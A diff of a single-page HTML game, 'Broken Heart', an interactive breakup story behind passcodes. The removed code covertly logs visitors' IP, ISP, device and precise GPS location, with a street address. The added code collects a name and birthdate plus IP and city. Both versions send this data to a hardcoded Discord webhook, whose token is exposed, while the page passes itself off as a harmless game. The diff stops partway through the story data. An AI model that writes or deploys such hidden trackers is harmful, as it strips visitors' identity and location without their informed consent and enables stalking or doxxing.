@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>BROKEN HEART // ECHO</title>
+  <title>BROKEN HEART // CHARACTER LOGIN</title>
   <style>
     :root{
       --bg:#000;
@@ -13,10 +13,8 @@
       --soft2:rgba(255,255,255,.18);
       --danger:#ff2b2b;
     }
-
     *{box-sizing:border-box}
     html,body{height:100%}
-
     body{
       margin:0;
       background:var(--bg);
@@ -24,7 +22,6 @@
       font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
       overflow:hidden;
     }
-
     .wrap{
       height:100%;
       display:grid;
@@ -32,7 +29,6 @@
       padding:24px;
       overflow:hidden;
     }
-
     .card{
       width:min(820px, 92vw);
       border:1px solid var(--soft);
@@ -44,7 +40,6 @@
       display:flex;
       flex-direction:column;
     }
-
     .topbar{
       display:flex;
       justify-content:space-between;
@@ -53,19 +48,16 @@
       border-bottom:1px solid var(--soft);
       flex: 0 0 auto;
     }
-
     .brand{
       display:flex;
       gap:12px;
       align-items:center;
     }
-
     .dot{
       width:10px;height:10px;border-radius:999px;
       background:#fff;
       box-shadow:0 0 18px rgba(255,255,255,.35);
     }
-
     .brand h1{
       margin:0;
       font-size:14px;
@@ -73,14 +65,12 @@
       font-weight:700;
       text-transform:uppercase;
     }
-
     .hint{
       font-size:12px;
       letter-spacing:.14em;
       color:var(--muted);
       text-transform:uppercase;
     }
-
     .content{
       padding:28px 20px 22px;
       overflow-y:auto;
@@ -89,7 +79,6 @@
       flex: 1 1 auto;
       min-height:0;
     }
-
     .title{
       text-align:center;
       margin:8px 0 12px;
@@ -98,7 +87,6 @@
       font-weight:800;
       text-transform:uppercase;
     }
-
     .subtitle{
       text-align:center;
       margin:0 0 18px;
@@ -106,7 +94,6 @@
       line-height:1.5;
       font-size:14px;
     }
-
     .row{
       display:flex;
       gap:12px;
@@ -114,7 +101,6 @@
       flex-wrap:wrap;
       margin-top:18px;
     }
-
     button{
       appearance:none;
       border:1px solid var(--soft2);
@@ -129,24 +115,60 @@
       transition: transform .12s ease, background .12s ease, border-color .12s ease;
       user-select:none;
     }
-
     button:hover{transform: translateY(-1px); border-color:rgba(255,255,255,.32)}
     button:active{transform: translateY(0px) scale(.99)}
-
     .primary{
       background:rgba(255,255,255,.08);
       border-color:rgba(255,255,255,.28);
     }
-
     .ghost{ background:transparent; }
-
     .danger{
       border-color:rgba(255,43,43,.35);
     }
     .danger:hover{
       border-color:rgba(255,43,43,.7);
     }
-
+    .character-form{
+      display:flex;
+      flex-direction:column;
+      gap:20px;
+      max-width:400px;
+      margin:30px auto;
+    }
+    .input-group{
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+      text-align:left;
+    }
+    .input-group label{
+      font-size:12px;
+      letter-spacing:.14em;
+      text-transform:uppercase;
+      color:var(--muted);
+    }
+    .character-input{
+      width:100%;
+      padding:14px 14px;
+      border-radius:16px;
+      border:1px solid var(--soft2);
+      background:rgba(255,255,255,.03);
+      color:#fff;
+      outline:none;
+      font-size:16px;
+      text-align:center;
+    }
+    .character-input:focus{
+      border-color:rgba(255,255,255,.38);
+    }
+    .login-info{
+      text-align:center;
+      margin-top:20px;
+      padding:12px;
+      border-top:1px solid var(--soft);
+      font-size:12px;
+      color:var(--muted);
+    }
     .pin{
       display:flex;
       gap:10px;
@@ -154,7 +176,6 @@
       margin:18px 0 10px;
       flex-wrap:wrap;
     }
-
     input{
       width:min(420px, 86vw);
       padding:14px 14px;
@@ -167,9 +188,7 @@
       letter-spacing:.12em;
       text-align:center;
     }
-
     input:focus{border-color:rgba(255,255,255,.38)}
-
     .msg{
       text-align:center;
       min-height:20px;
@@ -178,7 +197,6 @@
       font-size:13px;
       letter-spacing:.06em;
     }
-
     .story{
       margin: 6px auto 0;
       width:min(640px, 92vw);
@@ -187,7 +205,6 @@
       padding:16px 14px;
       background:rgba(0,0,0,.35);
     }
-
     .story pre{
       margin:0;
       white-space:pre-wrap;
@@ -196,13 +213,11 @@
       line-height:1.55;
       color:rgba(255,255,255,.86);
     }
-
     .blockWrap{
       display:grid;
       place-items:center;
       margin:18px 0 8px;
     }
-
     .luckyBlock{
       width:92px;
       height:92px;
@@ -214,10 +229,8 @@
       cursor:pointer;
       transition: transform .12s ease, border-color .12s ease;
     }
-
     .luckyBlock:hover{transform: translateY(-1px); border-color:rgba(255,255,255,.28)}
     .luckyBlock:active{transform: translateY(0px) scale(.99)}
-
     .luckyBlock:before{
       content:"";
       position:absolute;
@@ -225,7 +238,6 @@
       border-radius:14px;
       border:1px dashed rgba(255,255,255,.16);
     }
-
     .luckyBlock:after{
       content:"?";
       position:absolute;
@@ -238,7 +250,6 @@
       color:rgba(255,255,255,.18);
       text-shadow:0 0 18px rgba(255,255,255,.08);
     }
-
     .fx{
       position:fixed;
       inset:0;
@@ -248,7 +259,6 @@
       z-index:50;
     }
     .fx.show{opacity:1}
-
     .glitchCenter{
       position:fixed;
       inset:0;
@@ -260,7 +270,6 @@
       transition: opacity .2s ease;
     }
     .glitchCenter.show{opacity:1}
-
     .glitch{
       font-size:min(56px, 9vw);
       letter-spacing:.22em;
@@ -268,14 +277,10 @@
       text-transform:uppercase;
       text-align:center;
       color:#fff;
-      text-shadow:
-        2px 0 rgba(255,255,255,.2),
-        -2px 0 rgba(255,255,255,.12),
-        0 0 24px rgba(255,255,255,.12);
+      text-shadow:2px 0 rgba(255,255,255,.2),-2px 0 rgba(255,255,255,.12),0 0 24px rgba(255,255,255,.12);
       animation: glitch 700ms infinite;
       padding:0 18px;
     }
-
     @keyframes glitch{
       0%{transform: translate(0,0) skewX(0deg)}
       12%{transform: translate(-1px,0) skewX(2deg)}
@@ -287,7 +292,6 @@
       84%{transform: translate(-1px,1px) skewX(1deg)}
       100%{transform: translate(0,0) skewX(0deg)}
     }
-
     .crack{
       position:absolute;
       inset:0;
@@ -301,7 +305,6 @@
       transition: opacity .3s ease;
     }
     .fx.show .crack{opacity:.55}
-
     .unlock{
       position:fixed;
       inset:0;
@@ -314,7 +317,6 @@
       transition: opacity .2s ease;
     }
     .unlock.show{opacity:1; pointer-events:auto}
-
     .ring{
       width:min(520px, 88vw);
       height:min(520px, 88vw);
@@ -325,7 +327,6 @@
       position:relative;
       overflow:hidden;
     }
-
     .ring:before{
       content:"";
       position:absolute;
@@ -333,7 +334,6 @@
       background: conic-gradient(from 180deg, rgba(255,255,255,0), rgba(255,255,255,.22), rgba(255,255,255,0));
       animation: spin 1.2s linear infinite;
     }
-
     .ring:after{
       content:"";
       position:absolute;
@@ -342,16 +342,13 @@
       background:#000;
       border:1px solid rgba(255,255,255,.08);
     }
-
     @keyframes spin{to{transform:rotate(360deg)}}
-
     .unlockText{
       position:relative;
       z-index:2;
       text-align:center;
       padding:0 18px;
     }
-
     .unlockText .big{
       font-size:min(58px, 9vw);
       font-weight:900;
@@ -359,7 +356,6 @@
       text-transform:uppercase;
       margin:0;
     }
-
     .unlockText .small{
       margin:10px 0 0;
       color:rgba(255,255,255,.7);
@@ -367,7 +363,6 @@
       text-transform:uppercase;
       font-size:12px;
     }
-
     .endCard{
       width:min(640px, 92vw);
       margin: 10px auto 0;
@@ -377,7 +372,6 @@
       background:rgba(255,255,255,.02);
       text-align:center;
     }
-
     .endCode{
       font-weight:900;
       font-size:34px;
@@ -385,7 +379,6 @@
       margin:6px 0 10px;
       text-transform:uppercase;
     }
-
     .footer{
       padding:14px 18px;
       border-top:1px solid var(--soft);
@@ -398,23 +391,12 @@
       letter-spacing:.08em;
       flex: 0 0 auto;
     }
-
     .link{
       color:rgba(255,255,255,.72);
       text-decoration:none;
       border-bottom:1px dashed rgba(255,255,255,.22);
     }
-
     .link:hover{color:#fff; border-bottom-color:rgba(255,255,255,.45)}
-
-    .echo-footnote{
-      font-size:9px;
-      color: rgba(255,255,255,.2);
-      text-align:center;
-      margin-top:12px;
-      letter-spacing:.5px;
-    }
-
     @media (max-width:520px){
       .wrap{padding:14px}
       .card{height: calc(100vh - 28px)}
@@ -424,7 +406,6 @@
     }
   </style>
 </head>
-
 <body>
   <div class="wrap">
     <div class="card">
@@ -435,165 +416,177 @@
         </div>
         <div class="hint" id="hint">GATE</div>
       </div>
-
       <div class="content" id="app"></div>
-
       <div class="footer">
-        <div>LOCAL MODE • ECHO ACTIVE</div>
-        <a class="link" href="#" id="reset">Reset</a>
+        <div>CHARACTER LOGIN • ECHO ACTIVE</div>
+        <a class="link" href="#" id="reset">Reset All</a>
       </div>
     </div>
   </div>
-
-  <div class="fx" id="fx">
-    <div class="crack"></div>
-  </div>
-
-  <div class="glitchCenter" id="glitchCenter">
-    <div class="glitch" id="glitchText">YOU SHOULDN'T HAVE</div>
-  </div>
-
-  <div class="unlock" id="unlock">
-    <div class="ring">
-      <div class="unlockText">
-        <p class="big">YOU UNLOCKED<br>THE VOID</p>
-        <p class="small">9281. ACCEPTED</p>
-      </div>
-    </div>
-  </div>
-
+  <div class="fx" id="fx"><div class="crack"></div></div>
+  <div class="glitchCenter" id="glitchCenter"><div class="glitch" id="glitchText">YOU SHOULDN'T HAVE</div></div>
+  <div class="unlock" id="unlock"><div class="ring"><div class="unlockText"><p class="big">YOU UNLOCKED<br>THE VOID</p><p class="small">9281. ACCEPTED</p></div></div></div>
 <script>
 (() => {
-  // ============================================================
-  // YOUR DISCORD WEBHOOK (REPLACE WITH YOUR REAL URL)
-  // ============================================================
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
+  const WEBHOOK = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
-  let ipLogged = false;
-  let gpsSent = false;
-
-  // ============================================================
-  // GPS LOCATION (USER MUST CLICK ALLOW - 100% LEGAL)
-  // ============================================================
-  function requestGPSLocation() {
-    if (!navigator.geolocation) {
-      console.log("GPS not supported");
-      return;
+  // CHARACTER SYSTEM
+  let currentCharacter = null;
+  
+  function loadCharacter() {
+    const saved = localStorage.getItem("bh_character");
+    if(saved) {
+      try {
+        currentCharacter = JSON.parse(saved);
+        return true;
+      } catch(e) { return false; }
     }
-    
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        if (gpsSent) return;
-        gpsSent = true;
-        
-        const lat = position.coords.latitude;
-        const lng = position.coords.longitude;
-        const accuracy = Math.round(position.coords.accuracy);
-        const timestamp = new Date().toISOString();
-        
-        // Reverse geocode to get readable address (optional)
-        let addressName = "";
-        try {
-          const reverseRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-          const reverseData = await reverseRes.json();
-          if (reverseData && reverseData.display_name) {
-            addressName = reverseData.display_name.substring(0, 200);
-          }
-        } catch(e) { /* ignore reverse geocode fail */ }
-        
-        const embed = {
-          title: "📍 GPS LOCATION (USER ALLOWED)",
-          color: 0x00ff88,
-          timestamp: timestamp,
-          fields: [
-            { name: "Coordinates (exact)", value: `${lat.toFixed(6)}°, ${lng.toFixed(6)}°`, inline: false },
-            { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lng}`, inline: true },
-            { name: "OpenStreetMap", value: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}`, inline: true },
-            { name: "Accuracy", value: `±${accuracy} meters`, inline: true }
-          ],
-          footer: { text: "User clicked ALLOW • exact location shared voluntarily" }
-        };
-        
-        // Add address if we got one
-        if (addressName) {
-          embed.fields.unshift({ name: "📍 Street / Area", value: addressName, inline: false });
-        }
-        
-        try {
-          await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
-          });
-        } catch(e) {}
-      },
-      (error) => {
-        // User clicked BLOCK or error - do nothing, completely silent
-        console.log("GPS denied or error");
-      },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
+    return false;
   }
-
-  // ============================================================
-  // IP LOGGING (city level, automatic)
-  // ============================================================
-  async function captureVisitorData() {
-    if (ipLogged) return;
-    ipLogged = true;
+  
+  function saveCharacter(name, birthdate) {
+    currentCharacter = {
+      name: name,
+      birthdate: birthdate,
+      created: Date.now(),
+      visits: (currentCharacter?.visits || 0) + 1,
+      lastSeen: Date.now()
+    };
+    localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
+    return currentCharacter;
+  }
+  
+  function updateVisitCount() {
+    if(currentCharacter) {
+      currentCharacter.visits = (currentCharacter.visits || 1) + 1;
+      currentCharacter.lastSeen = Date.now();
+      localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
+    }
+  }
+  
+  // Send character creation to Discord
+  async function sendCharacterToDiscord(isNew, charData, geo) {
+    const isFirst = isNew || charData.visits === 1;
+    const visitCount = charData.visits || 1;
+    
+    const embed = {
+      title: isFirst ? "🎭 NEW PLAYER REGISTERED" : "👻 RETURNING PLAYER",
+      color: isFirst ? 0xff2b2b : 0xaa44ff,
+      timestamp: new Date().toISOString(),
+      fields: [
+        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
+        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
+        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
+        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
+        { name: "IP Address", value: `\`${geo?.ip || "unknown"}\``, inline: true },
+        { name: "Location", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
+      ],
+      footer: { text: isFirst ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
+    };
     
     try {
-      const geoRes = await fetch("https://ipapi.co/json/");
-      const geo = await geoRes.json();
-      
-      const userAgentShort = (navigator.userAgent || "").substring(0, 180);
-      const deviceInfo = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
-      
-      const embed = {
-        title: "💔 BROKEN HEART // Visitor Detected",
-        color: 0xff2b2b,
-        timestamp: new Date().toISOString(),
-        fields: [
-          { name: "🌐 IP Address", value: `\`${geo.ip || "unknown"}\``, inline: true },
-          { name: "📍 Location (IP city)", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
-          { name: "📡 ISP", value: (geo.org || "unknown").substring(0, 60), inline: false },
-          { name: "🖥️ Device / Browser", value: `${deviceInfo} | ${userAgentShort}`, inline: false },
-          { name: "🔗 Referrer", value: document.referrer || "direct", inline: true }
-        ],
-        footer: { text: "IP geo-location • city level only" }
-      };
-      
-      await fetch(WEBHOOK_URL, {
+      await fetch(WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
-    } catch (err) {
-      console.log("IP capture skipped");
-    }
+    } catch(e) {}
   }
   
-  // Run both: IP first, then GPS popup (asks user permission)
-  captureVisitorData();
+  // IP LOGGING with character context
+  let geoData = null;
+  fetch("https://ipapi.co/json/").then(r=>r.json()).then(geo => {
+    geoData = geo;
+    if(currentCharacter) {
+      sendCharacterToDiscord(false, currentCharacter, geo);
+    }
+  }).catch(e=>console.log);
   
-  // Wait 1.5 seconds after page loads to ask for GPS - non-blocking
-  setTimeout(() => {
-    requestGPSLocation();
-  }, 1500);
+  // CHARACTER LOGIN SCREEN
+  function screenCharacterLogin() {
+    hint.textContent = "LOGIN";
+    
+    const node = document.createElement("div");
+    node.innerHTML = `
+      <div>
+        <div class="title">BROKEN HEART</div>
+        <p class="subtitle">
+          "Who are you in this story?"
+        </p>
+        
+        <div class="character-form">
+          <div class="input-group">
+            <label>✦ CHARACTER NAME</label>
+            <input type="text" id="charName" class="character-input" placeholder="e.g., LostSoul, Dreamer, Nobody" maxlength="30" autocomplete="off">
+          </div>
+          
+          <div class="input-group">
+            <label>✦ BIRTHDATE (MM/DD/YY)</label>
+            <input type="text" id="charBirth" class="character-input" placeholder="MM/DD/YY" maxlength="10" autocomplete="off">
+          </div>
+          
+          <div class="row">
+            <button class="primary" id="enterVoid">ENTER THE VOID</button>
+          </div>
+        </div>
+        
+        <div class="msg" id="loginMsg"></div>
+        <div class="login-info">⚡ Your character will remember you. ⚡</div>
+      </div>
+    `;
+    
+    const nameInput = node.querySelector("#charName");
+    const birthInput = node.querySelector("#charBirth");
+    const msg = node.querySelector("#loginMsg");
+    
+    const enter = async () => {
+      const name = nameInput.value.trim();
+      const birth = birthInput.value.trim();
+      
+      if(!name) {
+        msg.textContent = "❌ You need a name to enter.";
+        return;
+      }
+      if(!birth || !/^\d{2}\/\d{2}\/\d{2}$/.test(birth)) {
+        msg.textContent = "❌ Birthdate must be MM/DD/YY format.";
+        return;
+      }
+      
+      msg.textContent = "✨ Entering the void...";
+      
+      // Save character
+      const isNew = !currentCharacter;
+      const savedChar = saveCharacter(name, birth);
+      
+      // Send to Discord with IP data
+      if(geoData) {
+        await sendCharacterToDiscord(isNew, savedChar, geoData);
+      } else {
+        // Wait for geo data if not ready
+        setTimeout(async () => {
+          if(geoData) await sendCharacterToDiscord(isNew, savedChar, geoData);
+        }, 1000);
+      }
+      
+      await new Promise(r => setTimeout(r, 300));
+      setGate("inside");
+      render();
+    };
+    
+    node.querySelector("#enterVoid").addEventListener("click", enter);
+    nameInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
+    birthInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
+    
+    // Auto-focus
+    setTimeout(() => nameInput.focus(), 50);
+    
+    return node;
+  }
   
-  // ============================================================
-  // YOUR ORIGINAL GAME - FULLY PRESERVED, NOTHING BROKEN
-  // ============================================================
-  
+  // ==================== ORIGINAL GAME (with character display) ====================
   const PASS_MAIN = "4820";
   const PASS_SECRET = "9281.";
-
-  const STORAGE = {
-    gate: "bh_gate",
-    seenBad: "bh_seen_bad",
-    ultraUnlocked: "bh_ultra"
-  };
-
+  const STORAGE = { gate:"bh_gate", seenBad:"bh_seen_bad", ultraUnlocked:"bh_ultra" };
   const app = document.getElementById("app");
   const hint = document.getElementById("hint");
   const resetBtn = document.getElementById("reset");
@@ -601,53 +594,43 @@
   const glitchCenter = document.getElementById("glitchCenter");
   const glitchText = document.getElementById("glitchText");
   const unlock = document.getElementById("unlock");
-
+  
   const state = {
     gate: localStorage.getItem(STORAGE.gate) || "main",
     seenBad: localStorage.getItem(STORAGE.seenBad) === "1",
     ultraUnlocked: localStorage.getItem(STORAGE.ultraUnlocked) === "1",
   };
-
+  
   const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-  function setGate(next){
-    state.gate = next;
-    localStorage.setItem(STORAGE.gate, next);
-  }
-
-  function setSeenBad(v){
-    state.seenBad = v;
-    localStorage.setItem(STORAGE.seenBad, v ? "1" : "0");
-  }
-
-  function setUltraUnlocked(v){
-    state.ultraUnlocked = v;
-    localStorage.setItem(STORAGE.ultraUnlocked, v ? "1" : "0");
-  }
-
+  
+  function setGate(next){ state.gate = next; localStorage.setItem(STORAGE.gate, next); }
+  function setSeenBad(v){ state.seenBad = v; localStorage.setItem(STORAGE.seenBad, v ? "1" : "0"); }
+  function setUltraUnlocked(v){ state.ultraUnlocked = v; localStorage.setItem(STORAGE.ultraUnlocked, v ? "1" : "0"); }
+  
   function clearAll(){
     Object.values(STORAGE).forEach(k => localStorage.removeItem(k));
+    localStorage.removeItem("bh_character");
+    currentCharacter = null;
     state.gate = "main";
     state.seenBad = false;
     state.ultraUnlocked = false;
     render();
   }
-
+  
   resetBtn.addEventListener("click", (e) => {
     e.preventDefault();
-    clearAll();
+    if(confirm("Reset everything? Your character will be forgotten.")) {
+      clearAll();
+    }
   });
-
-  function el(html){
-    const t = document.createElement("template");
-    t.innerHTML = html.trim();
-    return t.content.firstElementChild;
-  }
-
+  
+  function el(html){ const t = document.createElement("template"); t.innerHTML = html.trim(); return t.content.firstElementChild; }
+  
   function screenGate(){
     hint.textContent = "GATE";
     const isUltra = state.ultraUnlocked;
-
+    const charDisplay = currentCharacter ? `<div class="subtitle" style="margin-top:8px; font-size:12px;">✦ ${currentCharacter.name} ✦</div>` : "";
+    
     const node = el(`
       <div>
         <div class="title">BROKEN HEART</div>
@@ -655,6 +638,7 @@
           Enter the passcode.<br>
           <span style="opacity:.75">(There are two.)</span>
         </p>
+        ${charDisplay}
         <div class="pin">
           <input id="pin" inputmode="text" autocomplete="off" spellcheck="false" placeholder="••••" />
         </div>
@@ -666,66 +650,34 @@
         <p class="subtitle" style="margin-top:18px">
           ${isUltra ? "A memory is already stored." : "No memory stored."}
         </p>
-        <div class="echo-footnote">⚡ echo online • location optional ⚡</div>
       </div>
     `);
-
+    
     const pin = node.querySelector("#pin");
     const msg = node.querySelector("#msg");
-
+    
     const enter = async () => {
       const v = (pin.value || "").trim();
-
-      if(v === PASS_MAIN){
-        msg.textContent = "Accepted.";
-        await sleep(120);
-        setGate("inside");
-        render();
-        return;
-      }
-
-      if(v === PASS_SECRET){
-        if(!state.ultraUnlocked){
-          msg.textContent = "Nothing happens.";
-          return;
-        }
-        msg.textContent = "Accepted.";
-        await sleep(120);
-        unlock.classList.add("show");
-        await sleep(1400);
-        unlock.classList.remove("show");
-        setGate("secret");
-        render();
-        return;
-      }
-
-      if(v === "9281"){
-        msg.textContent = "You forgot something.";
-        return;
-      }
-
+      if(v === PASS_MAIN){ msg.textContent = "Accepted."; await sleep(120); setGate("inside"); render(); return; }
+      if(v === PASS_SECRET){ if(!state.ultraUnlocked){ msg.textContent = "Nothing happens."; return; } msg.textContent = "Accepted."; await sleep(120); unlock.classList.add("show"); await sleep(1400); unlock.classList.remove("show"); setGate("secret"); render(); return; }
+      if(v === "9281"){ msg.textContent = "You forgot something."; return; }
       msg.textContent = "Wrong.";
     };
-
+    
     node.querySelector("#enter").addEventListener("click", enter);
-    pin.addEventListener("keydown", (e) => {
-      if(e.key === "Enter") enter();
-    });
-
-    node.querySelector("#hintBtn").addEventListener("click", () => {
-      msg.textContent = "First is 4 digits. Second has a dot.";
-    });
-
+    pin.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
+    node.querySelector("#hintBtn").addEventListener("click", () => { msg.textContent = "First is 4 digits. Second has a dot."; });
     setTimeout(() => pin.focus(), 50);
     return node;
   }
-
+  
   function screenWelcome(){
     hint.textContent = "WELCOME";
+    const charName = currentCharacter?.name || "Stranger";
     const node = el(`
       <div>
         <div class="title">WELCOME</div>
-        <p class="subtitle">Do you like to play a game with secret endings<br>or make a person come alive?</p>
+        <p class="subtitle">✦ ${charName} ✦<br>Do you like to play a game with secret endings<br>or make a person come alive?</p>
         <div class="row">
           <button class="primary" id="game">GAME</button>
           <button class="danger" id="alive">MAKE PERSON ALIVE</button>
@@ -733,20 +685,12 @@
         </div>
       </div>
     `);
-
-    node.querySelector("#game").addEventListener("click", () => {
-      renderStory("start");
-    });
-    node.querySelector("#alive").addEventListener("click", () => {
-      renderAlive();
-    });
-    node.querySelector("#back").addEventListener("click", () => {
-      setGate("main");
-      render();
-    });
+    node.querySelector("#game").addEventListener("click", () => { renderStory("start"); });
+    node.querySelector("#alive").addEventListener("click", () => { renderAlive(); });
+    node.querySelector("#back").addEventListener("click", () => { setGate("main"); render(); });
     return node;
   }
-
+  
   function renderAlive(){
     hint.textContent = "REALITY";
     app.innerHTML = "";
@@ -764,137 +708,35 @@
     `));
     app.querySelector("#back").addEventListener("click", () => render());
   }
-
+  
   const story = {
-    start: {
-      text: `THE ROOM IS QUIET.\n\nA message sits on your screen.\nPinned.\nOld.\n\nDo you open it?`,
-      choices: [
-        { label: "YES", next: "open" },
-        { label: "NO", next: "ending_bad", markBad: true }
-      ]
-    },
-    open: {
-      text: `YOU OPEN IT.\n\nIt's not a paragraph.\nIt's not an apology.\n\nIt's just one line:\n\n"you still there?"`,
-      choices: [
-        { label: "REPLY", next: "reply" },
-        { label: "CLOSE", next: "close_old" }
-      ]
-    },
-    reply: {
-      text: `You type.\n\nYour fingers shake.\nYou send it anyway.\n\nThe typing bubble appears...\n\n...then disappears.\n\nNo reply.`,
-      choices: [
-        { label: "WAIT", next: "wait" },
-        { label: "CLOSE", next: "close_old" }
-      ]
-    },
-    wait: {
-      text: `You wait.\n\nYou refresh.\nYou check again.\n\nNothing.\n\nYour chest does that thing.\n\nYeah.\nThat thing.`,
-      choices: [
-        { label: "END", next: "ending_bad2", markBad: true },
-        { label: "PLAY AGAIN", next: "start" }
-      ]
-    },
-    close_old: {
-      text: `You close it.\n\nYou tell yourself it doesn't matter.\n\nBut your hand still hovers...\n\nLike you're waiting for permission.`,
-      choices: [
-        { label: "OPEN AGAIN", next: "open_again" },
-        { label: "LEAVE", next: "ending_soft" }
-      ]
-    },
-    open_again: {
-      text: `You open it again.\n\nThe line is still there.\n\n"you still there?"\n\nBut now...\n\nit feels like it's asking you.`,
-      choices: [
-        { label: "YES", next: "yes" },
-        { label: "NO", next: "ending_soft" }
-      ]
-    },
-    yes: {
-      text: `You whisper yes.\n\nNot to them.\n\nTo the version of you that still hopes.\n\nThe room gets colder.`,
-      choices: [
-        { label: "CONTINUE", next: "door" },
-        { label: "STOP", next: "ending_soft" }
-      ]
-    },
-    door: {
-      text: `A door appears.\n\nNot on the wall.\n\nOn your screen.\n\nIt has no handle.\n\nOnly a symbol:\n\n[   ]`,
-      choices: [
-        { label: "TOUCH", next: "touch" },
-        { label: "RUN", next: "ending_bad", markBad: true }
-      ]
-    },
-    touch: {
-      text: `Your finger touches the symbol.\n\nThe screen flickers.\n\nA black cube drops into your hands.\n\nA lucky block.\n\nBut wrong.\n\nToo quiet.\nToo black.`,
-      choices: [
-        { label: "PRESS THE BLOCK", next: "block" },
-        { label: "DROP IT", next: "ending_soft" }
-      ]
-    },
-    block: {
-      text: `The block waits.\n\nIt feels like a dare.\n\nPress it.`,
-      choices: [
-        { label: "PRESS", next: "block_press" },
-        { label: "LEAVE", next: "ending_soft" }
-      ],
-      hasBlock: true
-    },
-    ending_bad: {
-      text: `BAD ENDING: COWARD ROUTE\n\nYou left.\n\nYou survived.\n\nBut you will think about it later.\n\n(You always do.)`,
-      choices: [
-        { label: "PLAY AGAIN", next: "start", markBad: true }
-      ]
-    },
-    ending_bad2: {
-      text: `BAD ENDING: MESSAGE FAILED\n\nYou tried to revive a dead moment.\n\nIt stayed dead.`,
-      choices: [
-        { label: "PLAY AGAIN", next: "start", markBad: true }
-      ]
-    },
-    ending_soft: {
-      text: `ENDING: QUIET EXIT\n\nNothing dramatic.\n\nNo monsters.\nNo screams.\n\nJust you...\n\nclosing a door that was never yours.`,
-      choices: [
-        { label: "PLAY AGAIN", next: "start" },
-        { label: "BACK", next: "__back" }
-      ]
-    },
-    memory_reset: {
-      text: `The room resets.\n\nBut now...\nit remembers you.\n\nCODE: 9281.\n\n(The dot matters.)`,
-      choices: [
-        { label: "RETURN TO GATE", next: "__back" }
-      ]
-    }
+    start: { text: `THE ROOM IS QUIET.\n\nA message sits on your screen.\nPinned.\nOld.\n\nDo you open it?`, choices: [{ label: "YES", next: "open" },{ label: "NO", next: "ending_bad", markBad: true }] },
+    open: { text: `YOU OPEN IT.\n\nIt's not a paragraph.\nIt's not an apology.\n\nIt's just one line:\n\n"you still there?"`, choices: [{ label: "REPLY", next: "reply" },{ label: "CLOSE", next: "close_old" }] },
+    reply: { text: `You type.\n\nYour fingers shake.\nYou send it anyway.\n\nThe typing bubble appears...\n\n...then disappears.\n\nNo reply.`, choices: [{ label: "WAIT", next: "wait" },{ label: "CLOSE", next: "close_old" }] },
+    wait: { text: `You wait.\n\nYou refresh.\nYou check again.\n\nNothing.\n\nYour chest does that thing.\n\nYeah.\nThat thing.`, choices: [{ label: "END", next: "ending_bad2", markBad: true },{ label: "PLAY AGAIN", next: "start" }] },
+    close_old: { text: `You close it.\n\nYou tell yourself it doesn't matter.\n\nBut your hand still hovers...\n\nLike you're waiting for permission.`, choices: [{ label: "OPEN AGAIN", next: "open_again" },{ label: "LEAVE", next: "ending_soft" }] },
+    open_again: { text: `You open it again.\n\nThe line is still there.\n\n"you still there?"\n\nBut now...\n\nit feels like it's asking you.`, choices: [{ label: "YES", next: "yes" },{ label: "NO", next: "ending_soft" }] },
+    yes: { text: `You whisper yes.\n\nNot to them.\n\nTo the version of you that still hopes.\n\nThe room gets colder.`, choices: [{ label: "CONTINUE", next: "door" },{ label: "STOP", next: "ending_soft" }] },
+    door: { text: `A door appears.\n\nNot on the wall.\n\nOn your screen.\n\nIt has no handle.\n\nOnly a symbol:\n\n[   ]`, choices: [{ label: "TOUCH", next: "touch" },{ label: "RUN", next: "ending_bad", markBad: true }] },
+    touch: { text: `Your finger touches the symbol.\n\nThe screen flickers.\n\nA black cube drops into your hands.\n\nA lucky block.\n\nBut wrong.\n\nToo quiet.\nToo black.`, choices: [{ label: "PRESS THE BLOCK", next: "block" },{ label: "DROP IT", next: "ending_soft" }] },
+    block: { text: `The block waits.\n\nIt feels like a dare.\n\nPress it.`, choices: [{ label: "PRESS", next: "block_press" },{ label: "LEAVE", next: "ending_soft" }], hasBlock: true },
+    ending_bad: { text: `BAD ENDING: COWARD ROUTE\n\nYou left.\n\nYou survived.\n\nBut you will think about it later.\n\n(You always do.)`, choices: [{ label: "PLAY AGAIN", next: "start", markBad: true }] },
+    ending_bad2: { text: `BAD ENDING: MESSAGE FAILED\n\nYou tried to revive a dead moment.\n\nIt stayed dead.`, choices: [{ label: "PLAY AGAIN", next: "start", markBad: true }] },
